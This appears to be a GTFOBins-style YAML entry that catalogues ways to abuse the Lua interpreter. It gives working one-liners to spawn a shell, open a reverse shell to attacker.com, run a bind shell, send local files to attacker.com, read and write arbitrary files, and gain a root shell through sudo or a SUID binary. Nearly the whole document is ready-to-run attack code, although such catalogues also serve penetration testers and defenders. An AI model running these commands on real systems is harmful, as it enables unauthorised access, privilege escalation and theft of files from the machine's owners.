---
functions:
  shell:
    - code: lua -e 'os.execute("/bin/sh")'
  non-interactive-reverse-shell:
    - description: Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        lua -e 'local s=require("socket");
          local t=assert(s.tcp());
          t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
          while true do
            local r,x=t:receive();local f=assert(io.popen(r,"r"));
            local b=assert(f:read("*a"));t:send(b);
          end;
          f:close();t:close();'
  non-interactive-bind-shell:
    - description: Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed.
      code: |
        export LPORT=12345
        lua -e 'local k=require("socket");
          local s=assert(k.bind("*",os.getenv("LPORT")));
          local c=s:accept();
          while true do
            local r,x=c:receive();local f=assert(io.popen(r,"r"));
            local b=assert(f:read("*a"));c:send(b);
          end;c:close();f:close();'
  file-upload:
    - description: Send a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires `lua-socket` installed.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        lua -e '
          local f=io.open(os.getenv("LFILE"), 'rb')
          local d=f:read("*a")
          io.close(f);
          local s=require("socket");
          local t=assert(s.tcp());
          t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
          t:send(d);
          t:close();'
  file-download:
    - description: Fetch remote file sent to a local TCP port. Run `nc target.com 12345
        < "file_to_send"` on the attacker box to send the file. This requires `lua-socket` installed.
      code: |
        export LPORT=12345
        export LFILE=file_to_save
        lua -e 'local k=require("socket");
          local s=assert(k.bind("*",os.getenv("LPORT")));
          local c=s:accept();
          local d,x=c:receive("*a");
          c:close();
          local f=io.open(os.getenv("LFILE"), "wb");
          f:write(d);
          io.close(f);'
  file-write:
    - code: lua -e 'local f=io.open("file_to_write", "wb"); f:write("DATA"); io.close(f);'
  file-read:
    - code: lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
  sudo:
    - code: sudo lua -e 'os.execute("/bin/sh")'
  limited-suid:
    - code: ./lua -e 'os.execute("/bin/sh")'
---
